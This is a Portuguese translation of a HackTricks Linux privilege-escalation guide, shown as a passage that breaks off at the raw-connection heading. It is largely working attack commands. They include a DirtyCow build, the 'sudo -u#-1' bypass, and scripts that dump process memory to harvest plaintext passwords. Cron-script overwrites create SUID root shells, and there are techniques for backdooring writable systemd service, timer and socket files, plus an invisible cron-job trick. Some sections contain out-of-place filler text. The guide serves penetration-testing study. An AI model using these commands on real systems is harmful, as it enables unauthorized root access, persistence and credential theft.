# Escalada de Privilégios no Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações do Sistema

### Informações do SO

Vamos começar adquirindo algum conhecimento sobre o SO em execução.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Caminho

Se você **possui permissões de escrita em qualquer pasta dentro da variável `PATH`**, você pode ser capaz de sequestrar algumas bibliotecas ou binários:
```bash
echo $PATH
```
### Informações do ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Explorações de Kernel

Verifique a versão do kernel e se existe alguma exploração que possa ser usada para elevar privilégios.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernels vulneráveis e alguns **exploits já compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Outros sites onde você pode encontrar alguns **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões vulneráveis do kernel a partir desse site, você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
As seguintes são ferramentas que podem ajudar a procurar por exploits de kernel:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute no alvo, apenas verifica exploits para o kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez sua versão do kernel esteja mencionada em algum exploit de kernel e assim você terá certeza de que esse exploit é válido.

### CVE-2016-5195 (DirtyCow)

Elevação de privilégios no Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versão do Sudo

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

De @sickrov

O sudo é um utilitário de linha de comando que permite que usuários comuns executem comandos como superusuários ou outros usuários. No entanto, versões anteriores ao sudo v1.28 possuem uma vulnerabilidade de escalonamento de privilégios que pode ser explorada por um invasor.

Essa vulnerabilidade permite que um usuário mal-intencionado execute comandos com privilégios elevados, mesmo que não tenha permissão para isso. Isso pode levar a comprometimento do sistema e acesso não autorizado a recursos sensíveis.

Para mitigar essa vulnerabilidade, é altamente recomendado atualizar o sudo para a versão mais recente disponível. Isso garantirá que a vulnerabilidade seja corrigida e que seu sistema esteja protegido contra ataques de escalonamento de privilégios.

Além disso, é importante seguir as práticas recomendadas de segurança, como limitar o acesso ao sudo apenas a usuários confiáveis e monitorar regularmente o uso do sudo para detectar atividades suspeitas.

Lembre-se de que a segurança do sistema é uma responsabilidade contínua e requer atualizações regulares e boas práticas de segurança para garantir a proteção adequada contra ameaças.
```
sudo -u#-1 /bin/bash
```
### Falha na verificação de assinatura do Dmesg

Verifique a **máquina smasher2 do HTB** para um **exemplo** de como essa vulnerabilidade pode ser explorada.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema

To further enumerate the system, you can perform the following steps:

1. **Check for SUID/SGID binaries**: SUID (Set User ID) and SGID (Set Group ID) binaries are executables that run with the privileges of the file owner or group respectively. Use the command `find / -perm -4000 -type f 2>/dev/null` to find SUID binaries and `find / -perm -2000 -type f 2>/dev/null` to find SGID binaries.

2. **Check for writable directories**: Look for directories that are writable by all users, as they can be potential targets for privilege escalation. Use the command `find / -writable -type d 2>/dev/null` to find writable directories.

3. **Check for world-writable files**: World-writable files are files that can be modified by any user on the system. These files can be exploited to gain elevated privileges. Use the command `find / -perm -2 -type f 2>/dev/null` to find world-writable files.

4. **Check for cron jobs**: Cron jobs are scheduled tasks that run automatically at specified intervals. Check for any cron jobs that are running with elevated privileges. Use the command `crontab -l` to list the cron jobs for the current user.

5. **Check for installed software**: Look for any installed software that may have known vulnerabilities or misconfigurations. Use the command `dpkg -l` or `rpm -qa` to list the installed packages.

6. **Check for kernel vulnerabilities**: Check if the kernel version has any known vulnerabilities. Use the command `uname -a` to get the kernel version and search for any vulnerabilities associated with it.

7. **Check for open ports and services**: Identify any open ports and running services on the system. Use the command `netstat -tuln` to list the open ports and `ps aux` to list the running services.

By performing these steps, you can gather more information about the system and identify potential vulnerabilities or misconfigurations that can be exploited for privilege escalation.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
AppArmor é um sistema de segurança para o Linux que restringe as ações que um processo pode realizar. Ele define políticas de segurança baseadas em perfis para limitar os privilégios de um programa. Isso ajuda a proteger o sistema contra ataques de escalonamento de privilégios, pois impede que um processo comprometido execute ações não autorizadas. Para verificar se o AppArmor está em uso, você pode executar o comando `sudo apparmor_status`. Se estiver ativo, você verá uma lista de perfis de segurança em execução.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity é um conjunto de patches de segurança para o kernel do Linux que visa fortalecer as medidas de proteção e mitigar vulnerabilidades. Esses patches fornecem recursos avançados de segurança, como controle de acesso obrigatório (MAC), prevenção de execução de dados (DEP) e proteção contra estouro de pilha.

O Grsecurity é projetado para proteger contra ataques de escalonamento de privilégios, que são uma técnica comum usada por hackers para obter acesso privilegiado a um sistema. Esses ataques exploram vulnerabilidades no sistema operacional para elevar seus próprios privilégios e obter controle total sobre o sistema.

Ao aplicar os patches do Grsecurity, você pode fortalecer a segurança do seu sistema Linux, reduzindo a superfície de ataque e tornando mais difícil para os hackers explorarem vulnerabilidades. Esses patches são frequentemente usados por administradores de sistemas e profissionais de segurança para endurecer sistemas Linux e proteger contra ataques de escalonamento de privilégios.

No entanto, é importante observar que a aplicação dos patches do Grsecurity requer conhecimento técnico e pode exigir modificações no kernel do Linux. Portanto, é recomendável que você tenha experiência em administração de sistemas Linux antes de tentar implementar o Grsecurity em seu sistema.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
O PaX é um conjunto de patches de segurança para o kernel do Linux que visa mitigar vulnerabilidades de escalonamento de privilégios. Esses patches implementam várias técnicas de proteção, como a randomização de endereços de memória (ASLR), a proteção contra execução de dados (DEP) e a restrição de permissões de execução. Essas medidas ajudam a prevenir ataques de escalonamento de privilégios, tornando mais difícil para um invasor obter privilégios elevados em um sistema comprometido. O PaX é uma ferramenta valiosa para fortalecer a segurança do Linux e reduzir o risco de exploração de vulnerabilidades.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

O Execshield é uma técnica de proteção de segurança implementada no kernel do Linux para mitigar ataques de escalonamento de privilégios. Ele foi projetado para proteger o sistema contra explorações de estouro de buffer e ataques de injeção de código.

O Execshield implementa duas medidas principais de segurança:

1. **Randomização de espaço de endereço**: O Execshield randomiza o espaço de endereço do processo em tempo de execução, tornando mais difícil para um atacante prever a localização da memória do processo. Isso dificulta a exploração de vulnerabilidades baseadas em endereço fixo.

2. **Proteção NX**: O Execshield marca as páginas de memória como não executáveis (NX), impedindo a execução de código em áreas de memória que deveriam conter apenas dados. Isso ajuda a prevenir ataques de injeção de código, como ataques de estouro de buffer.

Essas medidas de segurança fornecidas pelo Execshield ajudam a fortalecer a segurança do sistema operacional Linux, tornando mais difícil para os atacantes explorarem vulnerabilidades e escalarem seus privilégios.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

O Security-Enhanced Linux (SElinux) é um mecanismo de controle de acesso obrigatório (MAC) para o kernel Linux. Ele fornece uma camada adicional de segurança, restringindo as ações que os processos podem realizar no sistema. O SElinux é usado para proteger contra ataques de escalonamento de privilégios, onde um invasor tenta obter privilégios mais altos do que os que possui inicialmente.

O SElinux implementa políticas de segurança que definem as permissões e restrições para processos, arquivos, diretórios e outros recursos do sistema. Essas políticas são baseadas em regras que determinam quais ações são permitidas ou negadas. O SElinux usa rótulos de segurança para identificar e controlar os objetos do sistema.

Ao habilitar o SElinux, você pode reforçar a segurança do seu sistema Linux, reduzindo a superfície de ataque e limitando o impacto de possíveis vulnerabilidades. No entanto, a configuração correta do SElinux pode ser complexa e requer um bom entendimento das políticas de segurança e das necessidades específicas do seu sistema.

Este guia aborda técnicas de endurecimento do SElinux para fortalecer a segurança do seu sistema Linux. Ele inclui instruções passo a passo para configurar e gerenciar o SElinux, bem como dicas e práticas recomendadas para evitar problemas comuns.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

O ASLR (Address Space Layout Randomization) é uma técnica de segurança utilizada para dificultar ataques de escalonamento de privilégios em sistemas Linux. O objetivo do ASLR é randomizar a localização na memória dos componentes do sistema, como bibliotecas compartilhadas, pilha e heap, tornando mais difícil para um invasor prever onde esses componentes estão localizados na memória.

O ASLR funciona randomizando os endereços de memória base em que os componentes do sistema são carregados. Isso significa que cada vez que o sistema é reiniciado, os endereços de memória serão diferentes, tornando mais difícil para um invasor explorar vulnerabilidades de escalonamento de privilégios.

Para habilitar o ASLR em um sistema Linux, você pode ajustar o valor da variável `/proc/sys/kernel/randomize_va_space`. O valor `0` desabilita o ASLR, enquanto o valor `2` habilita o ASLR para todos os componentes do sistema.

É importante notar que o ASLR não é uma solução completa para a segurança do sistema, mas é uma camada adicional de proteção que pode dificultar a vida de um invasor em potencial. É recomendado habilitar o ASLR em sistemas Linux para aumentar a segurança do sistema.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Fuga do Docker

Se você estiver dentro de um contêiner Docker, pode tentar escapar dele:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar se há informações privadas.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Também, verifique se **algum compilador está instalado**. Isso é útil se você precisar usar alguma exploração de kernel, pois é recomendado compilá-la na máquina onde você vai usá-la (ou em uma similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez haja alguma versão antiga do Nagios (por exemplo) que possa ser explorada para a escalada de privilégios...\
Recomenda-se verificar manualmente a versão do software instalado mais suspeito.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tiver acesso SSH à máquina, também poderá usar o **openVAS** para verificar se há software desatualizado e vulnerável instalado na máquina.

{% hint style="info" %}
_Observe que esses comandos mostrarão muitas informações que serão em sua maioria inúteis, portanto, é recomendável usar aplicativos como o OpenVAS ou similares que verificarão se alguma versão de software instalada é vulnerável a exploits conhecidos_
{% endhint %}

## Processos

Dê uma olhada nos **processos em execução** e verifique se algum processo possui **mais privilégios do que deveria** (talvez um tomcat sendo executado pelo root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique se há possíveis depuradores [**electron/cef/chromium**] em execução, você pode abusar disso para elevar privilégios. O **Linpeas** detecta isso verificando o parâmetro `--inspect` na linha de comando do processo.\
Também **verifique seus privilégios sobre os binários dos processos**, talvez você possa sobrescrever alguém.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados com frequência ou quando um conjunto de requisitos é atendido.

### Memória do processo

Alguns serviços de um servidor salvam **credenciais em texto claro dentro da memória**.\
Normalmente, você precisará de **privilégios de root** para ler a memória de processos que pertencem a outros usuários, portanto, isso geralmente é mais útil quando você já é root e deseja descobrir mais credenciais.\
No entanto, lembre-se de que **como usuário regular, você pode ler a memória dos processos que você possui**.

{% hint style="warning" %}
Observe que atualmente a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode despejar outros processos que pertencem ao seu usuário não privilegiado.

O arquivo _**/proc/sys/kernel/yama/ptrace\_scope**_ controla a acessibilidade do ptrace:

* **kernel.yama.ptrace\_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Esta é a forma clássica de como o ptrace funcionava.
* **kernel.yama.ptrace\_scope = 1**: apenas um processo pai pode ser depurado.
* **kernel.yama.ptrace\_scope = 2**: Apenas o administrador pode usar o ptrace, pois requer a capacidade CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Nenhum processo pode ser rastreado com o ptrace. Uma reinicialização é necessária para habilitar o rastreamento novamente.
{% endhint %}

#### GDB

Se você tiver acesso à memória de um serviço FTP (por exemplo), poderá obter o Heap e procurar dentro dele por credenciais.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, o arquivo **maps mostra como a memória é mapeada dentro do espaço de endereço virtual desse processo**; ele também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem expõe a própria memória dos processos**. A partir do arquivo **maps, sabemos quais regiões de memória são legíveis** e seus deslocamentos. Usamos essas informações para **procurar no arquivo mem e despejar todas as regiões legíveis** em um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereçamento virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só pode ser lido pelo usuário **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para Linux

ProcDump é uma reimaginação do clássico ProcDump, uma ferramenta da suíte Sysinternals para Windows, agora disponível para Linux. Você pode obtê-lo em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

Para fazer o dump da memória de um processo, você pode usar:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e fazer o dump do processo de propriedade sua
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (é necessário ter root)

### Credenciais da Memória do Processo

#### Exemplo manual

Se você descobrir que o processo do autenticador está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode despejar o processo (consulte as seções anteriores para encontrar diferentes maneiras de despejar a memória de um processo) e procurar por credenciais dentro da memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) irá **roubar credenciais em texto claro da memória** e de alguns **arquivos conhecidos**. É necessário ter privilégios de root para que funcione corretamente.

| Recurso                                           | Nome do Processo      |
| ------------------------------------------------- | --------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                          | lightdm               |
| VSFTPd (Conexões FTP Ativas)                      | vsftpd                |
| Apache2 (Sessões Ativas de Autenticação Básica HTTP) | apache2              |
| OpenSSH (Sessões SSH Ativas - Uso do Sudo)         | sshd:                 |

#### Expressões Regulares de Pesquisa/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tarefas agendadas/Cron jobs

Verifique se alguma tarefa agendada está vulnerável. Talvez você possa aproveitar um script sendo executado pelo root (vulnerabilidade de caractere curinga? pode modificar arquivos que o root usa? usar links simbólicos? criar arquivos específicos no diretório que o root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Caminho do Cron

Por exemplo, dentro do _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe como o usuário "user" possui privilégios de escrita sobre /home/user_)

Se dentro deste crontab o usuário root tentar executar algum comando ou script sem definir o caminho. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um shell de root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um caractere curinga (Injeção de Caractere Curinga)

Se um script executado pelo root contém um "**\***" dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como escalonamento de privilégios). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o caractere curinga for precedido por um caminho como** _**/algum/caminho/\***_ **, não é vulnerável (mesmo** _**./\***_ **não é).**

Leia a seguinte página para mais truques de exploração de caracteres curinga:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sobrescrevendo script Cron e symlink

Se você **puder modificar um script Cron** executado pelo root, você pode obter um shell muito facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado pelo root utiliza um **diretório no qual você tem acesso total**, talvez seja útil excluir essa pasta e **criar um link simbólico para outra pasta** que sirva um script controlado por você.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Tarefas cron frequentes

Você pode monitorar os processos para procurar por processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você possa aproveitar isso e elevar os privilégios.

Por exemplo, para **monitorar a cada 0,1s durante 1 minuto**, **ordenar por comandos menos executados** e excluir os comandos que foram executados com mais frequência, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso irá monitorar e listar todos os processos que iniciam).

### Trabalhos cron invisíveis

É possível criar um trabalho cron **colocando uma quebra de linha após um comentário** (sem caractere de nova linha), e o trabalho cron irá funcionar. Exemplo (observe o caractere de quebra de linha):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Serviços

### Arquivos _.service_ graváveis

Verifique se você pode escrever algum arquivo `.service`, se puder, você **poderá modificá-lo** para que ele **execute** sua **porta dos fundos quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez seja necessário aguardar até que a máquina seja reiniciada).\
Por exemplo, crie sua porta dos fundos dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Lembre-se de que se você tiver **permissões de gravação sobre os binários executados pelos serviços**, poderá alterá-los para portas dos fundos, para que quando os serviços sejam reexecutados, as portas dos fundos também sejam executadas.

### PATH do systemd - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, talvez seja possível **elevar privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços**, como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Em seguida, crie um **executável** com o **mesmo nome do caminho relativo binário** dentro da pasta PATH do systemd em que você pode escrever, e quando o serviço for solicitado a executar a ação vulnerável (**Iniciar**, **Parar**, **Recarregar**), sua **porta dos fundos será executada** (usuários não privilegiados geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Temporizadores**

**Temporizadores** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam arquivos ou eventos `**.service**`. Os **temporizadores** podem ser usados como uma alternativa ao cron, pois possuem suporte integrado para eventos de tempo de calendário e eventos de tempo monotônico e podem ser executados de forma assíncrona.

Você pode enumerar todos os temporizadores com:
```bash
systemctl list-timers --all
```
### Timers graváveis

Se você pode modificar um timer, você pode fazer com que ele execute algumas existências de systemd.unit (como um `.service` ou um `.target`)
```bash
Unit=backdoor.service
```
Na documentação, você pode ler o que é uma Unidade:

> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não especificado, esse valor é padrão para um serviço que tem o mesmo nome da unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendado que o nome da unidade ativada e o nome da unidade do temporizador sejam nomeados de forma idêntica, exceto pelo sufixo.

Portanto, para abusar dessa permissão, você precisaria:

* Encontrar alguma unidade do systemd (como um `.service`) que esteja **executando um binário gravável**
* Encontrar alguma unidade do systemd que esteja **executando um caminho relativo** e você tenha **privilégios de gravação** sobre o **PATH do systemd** (para se passar por esse executável)

**Saiba mais sobre temporizadores com `man systemd.timer`.**

### **Habilitando o Temporizador**

Para habilitar um temporizador, você precisa de privilégios de root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Observe que o **timer** é **ativado** criando um symlink para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Em resumo, um Unix Socket (tecnicamente, o nome correto é Unix Domain Socket, **UDS**) permite a **comunicação entre dois processos diferentes** na mesma máquina ou em máquinas diferentes em estruturas de aplicativos cliente-servidor. Para ser mais preciso, é uma forma de comunicação entre computadores usando um arquivo de descritores Unix padrão. (De [aqui](https://www.linux.com/news/what-socket/)).

Os sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai ouvir** o socket (o caminho do arquivo de socket AF\_UNIX, o número de porta IPv4/6 para ouvir, etc.)
* `Accept`: Aceita um argumento booleano. Se **verdadeiro**, uma **instância de serviço é iniciada para cada conexão recebida** e apenas o socket de conexão é passado para ela. Se **falso**, todos os sockets de escuta em si são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é iniciada para todas as conexões. Esse valor é ignorado para sockets de datagrama e FIFOs, onde uma única unidade de serviço manipula incondicionalmente todo o tráfego recebido. **Padrão: falso**. Por motivos de desempenho, é recomendado escrever novos daemons apenas de uma maneira adequada para `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Aceita uma ou mais linhas de comando, que são **executadas antes** ou **depois** dos **sockets**/FIFOs de escuta serem **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos para o processo.
* `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** dos **sockets**/FIFOs de escuta serem **fechados** e removidos, respectivamente.
* `Service`: Especifica o nome da unidade de **serviço a ser ativada** no **tráfego recebido**. Essa configuração só é permitida para sockets com Accept=no. Por padrão, é usado o serviço que tem o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Arquivos .socket graváveis

Se você encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e a porta dos fundos será executada antes que o socket seja criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
Observe que o sistema deve estar usando essa configuração de arquivo de socket, caso contrário, a porta dos fundos não será executada.

### Sockets graváveis

Se você **identificar algum socket gravável** (_agora estamos falando sobre Unix Sockets e não sobre os arquivos de configuração `.socket`_), então **você pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão bruta

